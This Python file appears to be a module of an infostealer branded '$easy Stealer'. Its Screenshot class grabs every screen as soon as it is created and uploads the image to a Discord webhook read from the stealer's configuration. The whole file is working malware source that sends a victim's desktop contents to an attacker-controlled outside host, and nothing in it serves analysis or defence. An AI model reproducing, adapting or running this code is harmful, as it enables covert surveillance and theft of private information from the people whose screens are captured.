from PIL import ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
import json
import requests

class Screenshot:
    def __init__(self):
        self.take_screenshot()
        self.send_screenshot()

    def take_screenshot(self):  
        image = ImageGrab.grab(
                    bbox=None,
                    all_screens=True,
                    include_layered_windows=False,
                    xdisplay=None
                )
        image.save(temp_path + "\\desktopshot.png")
        image.close()

    def send_screenshot(self):
        webhook_data = {
            "username": "$easy Stealer",
            "avatar_url": "https://media.discordapp.net/attachments/921705869689896980/1267398635923181608/mindset.png?ex=66a8a475&is=66a752f5&hm=b37414d162f13cc2d10999fb92521309bc7aa270e400094f5f8c01de9247b011&=&format=webp&quality=lossless",
            "embeds": [
                {
                    "color": 5639644,
                    "title": "Desktop Screenshot",
                    "image": {
                        "url": "attachment://image.png"
                    }
                }
            ]
        }
        
        with open(temp_path + "\\desktopshot.png", "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

        requests.post(__CONFIG__["webhook"], headers={'Content-type': encoder.content_type}, data=encoder)